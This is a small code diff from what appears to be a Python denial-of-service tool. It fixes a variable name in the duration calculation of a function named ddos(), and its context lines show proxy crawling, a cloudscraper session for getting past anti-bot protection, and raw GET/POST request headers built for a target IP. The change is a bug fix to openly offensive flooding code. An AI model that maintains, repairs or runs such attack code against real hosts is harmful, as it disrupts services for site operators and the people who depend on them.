@@ -2437,7 +2437,7 @@ def Headers(method):
 
 def ddos():
     socksCrawler()
-    until = datetime.datetime.now() + datetime.timedelta(seconds=int(time))
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(times))
     scraper = cloudscraper.create_scraper()
     get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
     post_host = "POST HTTP/1.1\r\nHost: " + ip + "\r\n"
